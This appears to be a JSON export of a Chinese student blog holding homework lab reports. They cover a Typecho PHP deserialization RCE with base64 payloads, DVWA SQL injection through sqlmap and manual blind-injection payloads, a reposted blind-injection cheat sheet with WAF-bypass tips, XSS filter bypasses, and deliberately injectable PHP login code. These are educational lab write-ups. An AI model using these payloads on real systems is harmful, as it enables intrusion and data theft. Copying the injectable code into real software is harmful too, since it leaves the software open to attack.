return $value; &#125;&#125;$config = unserialize(base64_decode($_GET['__typecho_config']));$db = new Typecho_Db($config['adapter']);?&gt; /*exp.php*/&lt;?phpclass Typecho_Feed&#123; private $item; public function __construct()&#123; $this-&gt;item = array( 'author' =&gt; new Typecho_Request(), ); &#125;&#125;class Typecho_Request&#123; private $_params = array(); private $_filter = array(); public function __construct()&#123; $this-&gt;_params['screenName'] = 'phpinfo()'; $this-&gt;_filter[0] = 'assert'; &#125;&#125;$exp = array( 'adapter' =&gt; new Typecho_Feed());echo base64_encode(serialize($exp));?&gt; 访问exp.php得到payload /exp.php/ YToxOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6MTp7czoxODoiAFR5cGVjaG9fRmVlZABpdGVtIjthOjE6e3M6NjoiYXV0aG9yIjtPOjE1OiJUeXBlY2hvX1JlcXVlc3QiOjI6e3M6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX3BhcmFtcyI7YToxOntzOjEwOiJzY3JlZW5OYW1lIjtzOjk6InBocGluZm8oKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fX19访问 http://127.0.0.1/1/typecho.php?__typecho_config=YToxOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6MTp7czoxODoiAFR5cGVjaG9fRmVlZABpdGVtIjthOjE6e3M6NjoiYXV0aG9yIjtPOjE1OiJUeXBlY2hvX1JlcXVlc3QiOjI6e3M6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX3BhcmFtcyI7YToxOntzOjEwOiJzY3JlZW5OYW1lIjtzOjk6InBocGluZm8oKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fX19 成功调用phpinfo() 执行其他系统命令 系统为windows系统，将phpinfo()更换为system(‘dir’) 拿到payload，访问 http://127.0.0.1/7/typecho.php?__typecho_config=YToxOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6MTp7czoxODoiAFR5cGVjaG9fRmVlZABpdGVtIjthOjE6e3M6NjoiYXV0aG9yIjtPOjE1OiJUeXBlY2hvX1JlcXVlc3QiOjI6e3M6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX3BhcmFtcyI7YToxOntzOjEwOiJzY3JlZW5OYW1lIjtzOjEzOiJzeXN0ZW0oJ2RpcicpIjt9czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfZmlsdGVyIjthOjE6e2k6MDtzOjY6ImFzc2VydCI7fX19fX0 调用成功","categories":[{"name":"漏洞测试作业","slug":"漏洞测试作业","permalink":"https://gitee.com/michelle19l/michelle19l/categories/%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%E4%BD%9C%E4%B8%9A/"}],"tags":[{"name":"漏洞测试","slug":"漏洞测试","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95/"},{"name":"反序列化漏洞","slug":"反序列化漏洞","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"}]},{"title":"漏洞测试作业十二：SQL注入","slug":"漏测作业/漏测作业十二","date":"2020-06-09T04:36:09.000Z","updated":"2020-06-12T04:18:52.543Z","comments":true,"path":"2020/06/09/漏测作业/漏测作业十二/","link":"","permalink":"https://gitee.com/michelle19l/michelle19l/2020/06/09/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E5%8D%81%E4%BA%8C/","excerpt":"","text":"题目基于DVWA里的SQL盲注案例，实施手工盲注，参考课本，撰写实验报告 解答使用sqlmap安装owasp解压压缩包，用vmware打开 登录 访问http://192.168.89.145 安装成功 选择 Damn Vulnerable Web Application,输入用户名和密码，进行登录，用户名密码均为user 设置安全级别为low 进行攻击选择sql injection，在userID处输入‘ 输入1 查看源码 &lt;?php if(isset($_GET['Submit']))&#123; // Retrieve data $id = $_GET['id']; $getid = \"SELECT first_name, last_name FROM users WHERE user_id = '$id'\"; $result = mysql_query($getid) or die('&lt;pre&gt;' . mysql_error() . '&lt;/pre&gt;' ); $num = mysql_numrows($result); $i = 0; while ($i &lt; $num) &#123; $first = mysql_result($result,$i,\"first_name\"); $last = mysql_result($result,$i,\"last_name\"); echo '&lt;pre&gt;'; echo 'ID: ' . $id . '&lt;br&gt;First name: ' . $first . '&lt;br&gt;Surname: ' . $last; echo '&lt;/pre&gt;'; $i++; &#125;&#125;?&gt; 复制输入1后的网址，运行sqlmap 设置代理更改浏览器设置 拦截cookie安装paros,打开，模拟会话劫持攻击 sudo apt-get install paros 得到网站请求痕迹，找到seession id 将sessid赋给cookie，传给浏览器 使用sqlmapsqlmap -u \"http://192.168.89.145/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#\" --cookie \"security=low; PHPSESSID=vprbcjsqmv3uoad7an8ofdmpq3; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada\" 列举数据库 sqlmap -u \"http://192.168.89.145/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#\" --cookie \"security=low; PHPSESSID=vprbcjsqmv3uoad7an8ofdmpq3; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada\" --dbs 列举表 sqlmap -u \"http://192.168.89.145/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#\" --cookie \"security=low; PHPSESSID=vprbcjsqmv3uoad7an8ofdmpq3; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada\" --tables -D dvwa 列举列 sqlmap -u \"http://192.168.89.145/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#\" --cookie \"security=low; PHPSESSID=vprbcjsqmv3uoad7an8ofdmpq3; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada\" --columns -T users -D dvwa 看到有password sqlmap -u \"http://192.168.89.145/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#\" --cookie \"security=low; PHPSESSID=vprbcjsqmv3uoad7an8ofdmpq3; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada\" --dump -C \"user,password\" columns -T users -D dvwa 得到了加密后的密码 进行字典攻击 攻击成功 手工盲注 判断是否存在注入，注入是字符型还是数字型输入1 显示想用用户存在 输入1’ and 1=1 # 单引号为了闭合原来的SQL语句中的第一个单引号，后面的#为了闭合后面的单引号，运行后显示存在 输入1‘ and 1=2 # 显示不存在 输入1 and 1=2 因为mysql对于数值型字段的输入如果有非字符，则只取前面的有效部分，所以也能输出 猜解当前数据库名长度输入1’ and length(database())=1 # 输入1’ and length(database())=2 # 输入1’ and length(database())=3 # 输入1’ and length(database())=4 # 有返回值，说明数据库名为4位 具体字符输入1’ and ascii(substr(database(),1,1))&gt;97 # 输入1’ and ascii(substr(database(),1,1))&lt;122 # 输入1’ and ascii(substr(database(),1,1))&lt;109 # 输入1’ and ascii(substr(database(),1,1))&lt;103 # 输入1’ and ascii(substr(database(),1,1))&lt;100 # 输入1’ and ascii(substr(database(),1,1))&gt;100 # 说明第一个字符ascii=100，所以是‘d’ 第二个字符ascii=118，所以是’v‘ 第三个字符ascii=100，所以是‘w’ 第四个字符ascii=97，所以是’a‘ 数据库名’dvwa‘ 猜解数据库中的表名猜解数据库中表的数量输入1’ and (select count(table_name) from information_schema.tables where table_schema=database())=1 # 输入1’ and (select count(table_name) from information_schema.tables where table_schema=database())=2 # 说明数据库中有两个表 猜表名长度输入 1’ and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=1 # 输入 1’ and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=1 # 说明第一个表名长度为9 二分猜表名输入 1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;97 # 存在 输入 1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;122 # 存在 输入 1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=103 # 存在 说明第一个字母为’g’ 第二个字母为117’u’ 1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))=117 # 第三个字母为101‘e’ 1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),3,1))=101# 猜解表中字段名输入 1’ and (select count(column_name) from information_schema.columns where table_name=’users’)=6 # 显示存在，说明users表中有六个字段，==注：和书中不同== 猜解字段名输入 1’ and length(substr((select column_name from information_schema.columns where table_name=’users’ limit 0,1),1))=1 #不存在输入 1’ and length(substr((select column_name from information_schema.columns where table_name=’users’ limit 0,1),1))=7 #存在 说明users表的第一个字段为7个字符长度 猜解所有字段名输入1’ and (select ascii(substr(column_name,1,1)) from information_schema.columns where table_name=”users” limit 1,1)=102#存在 猜解表中数据输入1’ and (select ascii(substr(user,1,1)) from users limit 1,1)&gt;1 # 时间盲注判断是否存在注入输入1’ and sleep(5),页面感到明显延迟 输入1 and sleep(5),没有延迟 猜解当前数据库名字的长度1’ and if(length(database())=1,sleep(5),1)#，没有延迟1’ and if(length(database())=4,sleep(5),1)#，有延迟 采用二分法猜解数据库名1’ and if(ascii(substr(database(),1,1))&gt;97,sleep(5),1)# 明显延迟 总结（转） 看到了一篇不错的总结:https://www.cnblogs.com/kyx599/articles/12345471.html 以下为转载内容 sql盲注 ：布尔注入及时间注入（合天网安学习整理）盲注：#盲注其实是sql注入的一种，之所以称为盲注是因为他不会根据你sql注入的攻击语句返回你想要知道的错误信息。盲注分为两类： 1.布尔盲注 布尔很明显Ture跟Fales，也就是说它只会根据你的注入信息返回Ture跟Fales，也就没有了之前的报错信息。 2.时间盲注 界面返回值只有一种,true 无论输入任何值 返回情况都会按正常的来处理。加入特定的时间函数，通过查看web页面返回的时间差来判断注入的语句是否正确。 基于布尔的盲注#在页面中，如果正确执行了SQL语句，则返回一种页面，如果SQL语句执行错误，则执行另一种页面。基于两种页面，来判断SQL语句正确与否，达到获取数据的目的 注意比如 ‘ ” 的注释通常用 –+ 或者 –%20 或者#来注释 注意闭合相关的语句比如 ）’ “等 用limit的原因是由于在页面显示的数据不够所有来限制其输出，然后通过limit中数字的变化来把所有的数据求出来 注意语法语言的不同会导致注释的不同，所有注释符要注意变通 Payload#网上的payload一般是利用ascii()、substr()、length()结合进行利用 获取数据库长度 and (select length(database()))&#x3D;长度 #可以通过大于等于等来进行猜测以下同理#database 数据库 逐字猜解数据库名 and (select ascii(substr(database(),位数,1)))&#x3D;ascii码 #位数的变化及从1，2，3变化即可通过ascii码以及猜解的数据库长度求出数据库的库名 猜解表名数量 and (select count(table_name) from information_schema.tables where table_schema&#x3D;database())&#x3D;数量 # information_schema.tables 专门用来储存所以表，5.0以上版本才有 猜解某个表长度 and (select length(table_name) from information_schema.tables where table_schema&#x3D;database() limit n,1)&#x3D;长度 #同理n从0来表示变化的表来求该库下的对应的表的长度 逐位猜解表名 and (select ascii(substr(table_name,1,1)) from information_schema.tables where table_schema &#x3D; database() limit n,1)&#x3D;ascii码 #从前面的1变化是求表名，而n变化是对应的库中的表 猜解列名数量 and (select count(*) from information_schema.columns where table_schema &#x3D; database() and table_name &#x3D; 表名)&#x3D;数量#information_schema.columns 专门用来存储所有的列 猜解某个列长度 and (select length(column_name) from information_schema.columns where table_name&#x3D;&quot;表名&quot; limit n,1)&#x3D;长度 逐位猜解列名 and (select ascii(substr(column_name,位数,1)) from information_schema.columns where table_name&#x3D;&quot;表名&quot; limit n,1)&#x3D;ascii码 判断数据的数量 and (select count(列名) from 表名)&#x3D;数量 猜解某条数据的长度 and (select length(列名) from 表名 limit n,1)&#x3D;长度 逐位猜解数据 and (select ascii(substr(user,位数,1)) from 表名 limit n,1)&#x3D;ascii码 盲注tips#过滤了substr函数怎么办#用如下函数 left(str,index) 从左边第index开始截取 right(str,index) 从右边第index开始截取 substring(str,index) 从左边index开始截取 mid(str,index,ken) 截取str 从index开始,截取len的长度 lpad(str,len,padstr) rpad(str,len,padstr) 在str的左(右)两边填充给定的padstr到指定的长度len,返回填充的结果 过滤了等于号怎么办？#1、用in() 2、用like 过滤了ascii()怎么办？#hex() bin() ord() 过滤了字段名怎么办？#1、order by 盲注 条件：有回显，给出字段结构 order by用于根据指定的列对结果集进行排序。一般上是从0-9a-z这样排序，不区分大小写。先看下id为1的查询结果 执行如下payload select * from users where id&#x3D;1 union select 1,&#39;d&#39;,3 order by 2 发现我们联合查询的数据d排在前面再执行如下payload select * from users where id&#x3D;1 union select 1,&#39;z&#39;,3 order by 2 发现联合查询的数据z排在后面了。这是什么意思呢？第一次联合查询的d，排在前面，是因为id为1的数据第一位是d，所以排在前面了。而id为1的数据第一位不是z，所以z就排在后面了，我们可以利用这个特性来进行布尔盲注，只要猜0-9，a-z，逐字猜解就好 2、子查询 这个东西没啥好解释的，直接看payload吧 select * from users where id&#x3D;-1 union select 1,2,x.2 from (select * from (select 1)a,(select 2)b,(select 3)c union select * from users)x 实例演示#一个卖吃鸡外挂的网站 , 创建订单那存在SQL注入，利用上面常规payload获取到数据库名了，数据库名为chiji，进行到获取表数量就开始拦截了。发现是360主机卫士拦截了，本来想按照bypass老哥发的文章进行绕过的，发现各种方法都不行，可能是站长修改了规则。自己测试，发现select 1不拦截。select 1 from不拦截。select 1 from 1拦截。所以我们要破坏select from的结构才能进行绕过。后来询问@撕夜师傅发现去掉from前面的空格即可绕过。后面的步骤参考上面的payload即可 基于时间的盲注#布尔盲注是根据页面正常否进行注入，而时间盲注则是通过SQL语句查询的时间来进行注入,一般是在页面无回显，无报错的情况下使用 可以通过F12来看其页面回显的时间与布尔盲注是一样的 猜解数据库长度 and if((select length(database()))&#x3D;长度,sleep(6),0) 猜解数据库名 and if((select ascii(substr(database(),位数,1))&#x3D;ascii码),sleep(6),0) 判断表名的数量 and if((select count(table_name) from information_schema.tables where table_schema&#x3D;database())&#x3D;个数,sleep(6),0) 判断某个表名的长度 and if((select length(table_name) from information_schema.tables where table_schema&#x3D;database() limit n,1)&#x3D;长度,sleep(6),0) 逐位猜表名 and if((select ascii(substr(table_name,位数,1)) from information_schema.tables where table_schema&#x3D;database() limit n,1)&#x3D;ascii码,sleep(6),0) 判断列名数量 and if((select count(column_name) from information_schema.columns where table_name&#x3D;&quot;表名&quot;)&#x3D;个数,sleep(6),0) 判断某个列名的长度 and if((select length(column_name) from information_schema.columns where table_name&#x3D;&quot;表名&quot; limit n,1)&#x3D;长度,sleep(6),0) 逐位猜列名 and if((select ascii(substr(column_name,位数,1)) from information_schema.columns where table_name&#x3D;&quot;表名&quot; limit n,1)&#x3D;ascii码,sleep(6),0) 判断数据的数量 and if((select count(列名) from 表名)&#x3D;个数,sleep(6),0) 判断某个数据的长度 and if((select length(列名) from 表名)&#x3D;长度,sleep(6),0) 逐位猜数据 and if((select ascii(substr(列名,n,1)) from 表名)&#x3D;ascii码,sleep(6),0) 时间盲注小tips#如果过滤了sleep，还可以用benchmark()，这个函数第一个值填要执行的次数，第二个填写要执行的表达式 select * from users where id&#x3D;1 and if(ascii(substring((database()),1,1))&gt;1,(select benchmark(10000000,md5(0x41))),1) 转载文章#https://sqlmap.wiki/post/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E4%B9%8B%E7%9B%B2%E6%B3%A8/ https://www.jianshu.com/p/65f05e7cc957 作者：delusion 出处：https://www.cnblogs.com/kyx599/articles/12345471.html 版权：本文采用「署名 4.0 国际」知识共享许可协议进行许可。 分类: SQL注入 1 0 posted @ 2020-02-22 15:12 &amp;delusion 阅读(142) 评论(0) 编辑 收藏 注册用户登录后才能发表评论，请 登录 或 注册， 访问 网站首页。 Copyright © 2020 &amp;delusionPowered by .NET Core on Kubernetes &amp; Theme Silence v2.0.2&amp; Theme Silence v2.0.2","categories":[{"name":"漏洞测试作业","slug":"漏洞测试作业","permalink":"https://gitee.com/michelle19l/michelle19l/categories/%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%E4%BD%9C%E4%B8%9A/"}],"tags":[{"name":"漏洞测试","slug":"漏洞测试","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95/"},{"name":"OWASP","slug":"OWASP","permalink":"https://gitee.com/michelle19l/michelle19l/tags/OWASP/"},{"name":"DVWA","slug":"DVWA","permalink":"https://gitee.com/michelle19l/michelle19l/tags/DVWA/"},{"name":"SQLi","slug":"SQLi","permalink":"https://gitee.com/michelle19l/michelle19l/tags/SQLi/"}]},{"title":"漏洞测试作业十一：跨站脚本攻击","slug":"漏测作业/漏测作业十一","date":"2020-06-08T04:36:09.000Z","updated":"2020-06-12T04:09:14.876Z","comments":true,"path":"2020/06/08/漏测作业/漏测作业十一/","link":"","permalink":"https://gitee.com/michelle19l/michelle19l/2020/06/08/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E5%8D%81%E4%B8%80/","excerpt":"","text":"题目复现课本实验三，通过img和script两类方式实现跨站脚本攻击，撰写实验报告，有能力者，可以自己撰写更安全的过滤程序 解答xss_test.php &lt;!DOCTYPE html&gt;&lt;head&gt;&lt;meta http-equiv=\"content-type\" content=\"text/html;charset=utf-8\"&gt;&lt;script&gt;window.alert = function()&#123; confirm(\"congratulations\");// 确认对话框，验证攻击是否成功&#125;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;h1 align=center&gt;--welcome to the simple xss test--&lt;/h1&gt;&lt;?phpini_set(\"display_errors\",0);$str=strtolower($_GET[\"keyword\"]);$str2=str_replace(\"script\",\"\",$str);$str3=str_replace(\"on\",\"\",$str2);$str4=str_replace(\"src\",\"\",$str3);echo \"&lt;h2 align=center&gt;Hello \".htmlspecialchars($str).\".&lt;/h2&gt;\".'&lt;center&gt;&lt;form action=xss_test.php method=GET&gt;&lt;input type=submit name=submit value=Submit /&gt;&lt;input name=keyword value=\"'.$str4.'\"&gt;&lt;/form&gt;&lt;/center&gt;';?&gt;&lt;/body&gt;&lt;/html&gt; script方法 查看网页源码 输入123 输入&lt;script&gt; alert(&#39;123&#39;);&lt;/script&gt; 猜测源代码中有替换script功能的代码，htmlspecialchars可以实现预定义字符的转换 输入&lt;scrscriptipt&gt;alert(&#39;123&#39;);&lt;/scriscriptpt&gt; 显示&lt;script&gt; alert(\\&#39;123\\&#39;);&lt;/script&gt; 用&quot;&gt;替换高亮部分，是&lt;input 闭合 输入&quot;&gt; &lt;scriscriptpt&gt;alert();&lt;/scscriptript&gt; 攻击成功（没有关闭双引号转义，攻击依然成功） img方法==&lt;img src=ops! onerror=”alert(‘XSS’)”&gt;== &lt;img&gt;标签是用来定义HTML中的图像，src一般是图像的来源，而onerror事件会在文档或图像加载过程中发生错误是被触发。所以上面这个攻击脚本的逻辑是，当img加载一个错误的图像来源ops！时，回触发onerror事件，从而执行alert函数 在phpnow/php/php-apache2handler.ini中修改查找到的第二个magic_quotes_gpc=Off，关掉双引号转义 输入&quot;&gt;&lt;img srsrcc=ops! oonnerror=&quot;alert()&quot;&gt; 攻击成功 更安全的过滤程序循环检测输入语句中是否有scripts,on,src的关键字","categories":[{"name":"漏洞测试作业","slug":"漏洞测试作业","permalink":"https://gitee.com/michelle19l/michelle19l/categories/%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%E4%BD%9C%E4%B8%9A/"}],"tags":[{"name":"漏洞测试","slug":"漏洞测试","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95/"},{"name":"跨站脚本攻击","slug":"跨站脚本攻击","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/"}]},{"title":"php学习三 —— 函数应用","slug":"php/php3","date":"2020-06-05T13:03:31.000Z","updated":"2020-06-12T08:15:02.370Z","comments":true,"path":"2020/06/05/php/php3/","link":"","permalink":"https://gitee.com/michelle19l/michelle19l/2020/06/05/php/php3/","excerpt":"","text":"参考书籍《细说PHP》 函数function 函数名([参数1，参数2，参数3])//参数不需要标明类型&#123; 函数体; return;&#125; PHP7以后增加了对返回类型的声明 function 函数名([参数1，参数2，参数3]) :类型&#123; 函数体; return;&#125; eg function swap(&amp;$left,&amp;$right):void&#123;....&#125;......$a=1;$b=2;vardump(swap($a,$b),$a,$b);//输出为NULL int(1) int(2) 可以在参数前添加类型限制，默认为对不符合要求的形参进行强制类型转换 若使用严格模式，则参数不满足要求时会报TypeError &lt;?php //声明严格模式 declare(strict_type=1); function ...... 指定默认值：function demo($a=1); 允许使用NULL作为默认参数 作用域在函数中无法使用全局变量 &lt;?php $one=100; function demo()&#123; echo $one; &#125; demo();//输出结果为0或者空，因为为未初始化的初值 在函数中如果想使用全局变量，应该使用下面的写法 &lt;?php $one=100; function demo()&#123; echo $GLOBALS['one']; &#125; demo();//输出结果为0，因为为未初始化的初值 在函数中声明静态变量：static $a=0; 可变个数参数的函数funtion more_args()&#123; $args=func_get_args(); //将所有传递给脚本函数的参数当作一个数组返回 for($i=0;$i&lt;count($args);$i++) &#123; echo \"第\".$i.\"个参数是\".args[$i].\"&lt;br&gt;\"; &#125;&#125;more_args(\"one\",\"two\",\"three\",1,2,3) function more_args()&#123; for($i=0;$i&lt;func_num_args();$i++) echo func_get_args($i);&#125;more_args(\"one\",\"two\",\"three\",1,2,3) array(),echo(),array_merge()等函数也可以传递任意多个参数 //&gt;=php5.6，使用...实现变长参数函数function sum(...$ints)&#123; return array_sum($ints);//返回数组所有成员求和的结果&#125;//使用不同个数的参数调用函数var_dump(sum('2','3',4.1,10,true));//输出\"float(20.1)//规定返回值类型function sums(...$ints):int&#123; return array_sum($ints);//返回数组所有成员求和的结果&#125;var_dump(sums('2','3',4.1,10,true));//输出“int(20) //使用...将数组和可便利对象展开为函数参数function add($a,$b,$c,$d)&#123; return $a+$b+$c+$d;&#125;$operators=[2,3,4];echo add(1,...$operators); //?,可以传递null参数function fun(?$string)&#123;&#125;fun('xxx');fun(null);//都可以fun();//不行 回调函数变量函数function one($a,$b)&#123;&#125;function two($a,$b)&#123;&#125;$result=\"one\";echo $result(2,3);//调用函数one 变量函数不能应用于echo、print、unset、isset、empty、include、require 使用变量函数声明应用和回调函数function filter($fun)&#123; for($i=0;$i&lt;100;$i++)&#123; if($fun($i))//调用和变量值同名的函数 continue; echo $i.'&lt;br&gt;' &#125;&#125;function one($num)&#123; return $num%3==0;&#125;funtion two($num)&#123;return $num==strrev($num);&#125;//回文数filter(\"one\");//打印出100以内的非3的倍数 借助call_user_func_array()函数自定义回调函数funtion fun($a,$b)&#123;&#125;call_user_func_array('fun',array($a,$b)); function filter($fun)&#123; for($i=0;$i&lt;0;$i++)&#123; if(call_user_func_array($fun,array($i))) continue; echo $i.'&lt;br&gt;'; &#125;&#125; 类静态函数和对象的方法回调class demo&#123; static function fun()&#123;&#125;&#125;class test&#123; funtion fun()&#123;&#125;&#125;call_user_func_array(array(\"Demo\",\"fun\"),array(\"aaa\",\"bbb\"));call_user_func_array(array(new test(),\"fun\"),array(\"brophp\",\"学习型php\")) 递归函数使用自定义库和函数&lt;?php require 'config.php';//使用require语句包含并执行config.php文件 if($condition) include 'file.txt';//使用include语句在，包含并执行file.txt文件 require ('somefile.txt');//使用require包含并执行 include在流程控制中使用，当php脚本读到它时，才将它包含的文件都进来 require在文件的开头和结尾使用，在脚本执行前读入索隐入的文件 include_once()\\require_once() 文件只能被包括一次，避免函数重定义及变量重新赋值等问题 php匿名函数和闭包$fun=funtion($param)&#123;//将一个没有名字的函数赋值给一个变量$fun echo $param;&#125;$fun('abcd');","categories":[{"name":"web","slug":"web","permalink":"https://gitee.com/michelle19l/michelle19l/categories/web/"}],"tags":[{"name":"web","slug":"web","permalink":"https://gitee.com/michelle19l/michelle19l/tags/web/"},{"name":"php","slug":"php","permalink":"https://gitee.com/michelle19l/michelle19l/tags/php/"}]},{"title":"漏洞测试作业十：WEB开发实践","slug":"漏测作业/漏测作业十","date":"2020-06-01T08:53:03.000Z","updated":"2020-06-12T04:08:43.871Z","comments":true,"path":"2020/06/01/漏测作业/漏测作业十/","link":"","permalink":"https://gitee.com/michelle19l/michelle19l/2020/06/01/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A/%E6%BC%8F%E6%B5%8B%E4%BD%9C%E4%B8%9A%E5%8D%81/","excerpt":"","text":"题目复现课本第九章的实验三：利用php编写简单的数据库插入、查询和删除操作的示例 基于课本的完整例子，进一步了解WEB开发的细节 解答0.php学习登录界面 login.htm &lt;html&gt;&lt;body&gt;&lt;form id=\"form1\" method = \"post\" action=\"login.php\"&gt; &lt;table width=\"900\" border=\"0\" cellspacing=\"0\"&gt; &lt;tr&gt; &lt;td height=\"20\"&gt;姓名&lt;/td&gt; &lt;td height=\"20\"&gt;&lt;label&gt; &lt;input name=\"username\" type=\"text\" id=\"username\"/&gt; &lt;/label&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td height=\"20\"&gt;口令&lt;/td&gt; &lt;td height=\"20\"&gt;&lt;label&gt; &lt;input name=\"pwd\" type=\"password\" id=\"pwd\"/&gt; &lt;/label&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td height=\"20\"&gt;&amp;nbsp;&lt;/td&gt; &lt;td height=\"20\"&gt;&lt;label&gt; &lt;input name=\"submit\" type=\"Submit\" value=\"提交\"/&gt; &lt;/label&gt;&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt; login.php &lt;?php$username=$_POST['username'];$pwd=$_POST['pwd'];$SQLStr=\"select * from userinfo where username='$username' and pwd='$pwd'\";echo $SQLStr;?&gt; 链接数据库 &lt;?php$conn=mysql_connect(\"localhost\",\"root\",\"123456\");//connect to database$username=$_POST['username'];$pwd=$_POST['pwd'];$SQLStr=\"select * from userinfo where username='$username' and pwd='$pwd'\";echo $SQLStr;$result=mysql_db_query(\"testDB\",$SQLStr,$conn);//execute sql// fetch the resultif($row=mysql_fetch_array($result)) echo \"&lt;br&gt;OK&lt;br&gt;\";else echo \"&lt;br&gt;false&lt;br&gt;\";//releasemysql_free_result($result);//close connectionmysql_close($conn);?&gt; 查询数据 &lt;?php$conn=mysql_connect(\"localhost\",\"roor\",\"123456\");$SQLStr=\"select * from userinfo\";echo $SQLStr;$result=mysql_db_query(\"testDB\",\"root\",\"123456\");//获取查询结果if($rrow=mysql_fetch_array($result))//通过循环读取内容&#123; echo \"&lt;br&gt;OK...表内容&lt;br&gt;\"; //定位到第一条记录 mysql_data_seek($reult,0); //循环取出记录 while($row=mysql_fetch_row($result)) &#123; for($i=0;$i&lt;mysql_num_fields($result);$i++) &#123; echo $row[$i]; echo \" | \"; &#125; echo \"&lt;br&gt;\"; &#125;&#125;else &#123;echo \"&lt;br&gt;false&lt;br&gt;\";&#125;//释放资源mysql_free_result($result);//关闭连接mysql_close($conn); 1.创建数据库和表创建数据库testDB 创建表news(newsid,topic,content)和userinfo(username,password) 点击保存 2.php文件编写index.php cellspacing 单元格间距，cellpadding 补白，是指单元格内文字与边框的距离; &lt;html&gt;&lt;head&gt;&lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=gb2312\" /&gt;&lt;title&gt;主页&lt;/title&gt;&lt;/head&gt;&lt;?php $conn=mysql_connect(\"localhost\", \"root\", \"123456\"); ?&gt;&lt;body&gt;&lt;div align=\"center\"&gt; &lt;table width=\"900\" border=\"0\" cellspacing=\"0\" cellpadding=\"0\"&gt; &lt;tr&gt; &lt;td height=\"40\"&gt;&lt;form id=\"form1\" name=\"form1\" method=\"post\" action=\"loginok.php\"&gt; &lt;div align=\"right\"&gt;用户名： &lt;input name=\"username\" type=\"text\" id=\"username\" size=\"12\" /&gt; 密码： &lt;input name=\"password\" type=\"password\" id=\"password\" size=\"12\" /&gt; &lt;input type=\"submit\" name=\"Submit\" value=\"提交\" /&gt; &lt;/div&gt; &lt;/form&gt; &lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;&lt;hr /&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td height=\"300\" align=\"center\" valign=\"top\"&gt;&lt;table width=\"600\" border=\"0\" cellspacing=\"0\" cellpadding=\"0\"&gt; &lt;tr&gt; &lt;td width=\"100\" height=\"30\"&gt;&lt;div align=\"center\"&gt;新闻序号&lt;/div&gt;&lt;/td&gt; &lt;td&gt;&lt;div align=\"center\"&gt;新闻标题&lt;/div&gt;&lt;/td&gt; &lt;/tr&gt;&lt;?php $SQLStr = \"select * from news\"; $result=mysql_db_query(\"testDB\", $SQLStr, $conn); if ($row=mysql_fetch_array($result))//通过循环读取数据内容 &#123; // 定位到第一条记录 mysql_data_seek($result, 0); // 循环取出记录 while ($row=mysql_fetch_row($result)) &#123; ?&gt; &lt;tr&gt; &lt;td height=\"30\"&gt;&lt;div align=\"center\"&gt; &lt;?php echo $row[0] ?&gt; &lt;/div&gt;&lt;/td&gt; &lt;td&gt; &lt;div align=\"center\"&gt; &lt;a href=\"news.php?newsid=&lt;?php echo $row[0] ?&gt; \" &gt; &lt;?php echo $row[1] ?&gt; &lt;/a&gt; &lt;/div&gt;&lt;/td&gt; &lt;/tr&gt;&lt;?php &#125; &#125; ?&gt; &lt;/table&gt;&lt;/td&gt; 